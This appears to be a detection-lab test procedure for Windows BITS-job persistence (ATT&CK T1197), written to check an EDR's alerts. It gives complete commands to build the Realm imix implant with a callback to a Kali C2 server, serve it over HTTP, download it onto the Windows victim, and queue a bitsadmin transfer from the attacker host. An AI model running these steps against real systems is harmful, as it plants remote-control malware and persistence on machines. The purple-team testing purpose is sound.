# Test: Persistence — BITS job with queued transfer (T1197)

**Chain:** a Background Intelligent Transfer job that never completes — `svchost`-hosted,
survives reboots, and (in the real attack) runs an arbitrary command via `SetNotifyCmdLine`
when its state changes. LockBit/SocksforSystem-grade persistence.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1 -Kali 172.16.69.109`

```powershell
bitsadmin /create CCDCTestJob2
bitsadmin /addfile CCDCTestJob2 http://172.16.69.109:8000/imix.exe C:\Users\Public\sysupd.exe
# job stays queued = the persistence primitive
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `PERS-BITS` | high | auditor: `bitsadmin /list` enumeration diff (any queued job on a server is anomalous) |

**Verified live** on this machine — a queued job alerted within one audit cycle. Note: an
*empty* suspended job is reaped when its session exits; the queued `/addfile` is what persists.

**Cleanup:** `bitsadmin /cancel CCDCTestJob2` (global cleanup does this).
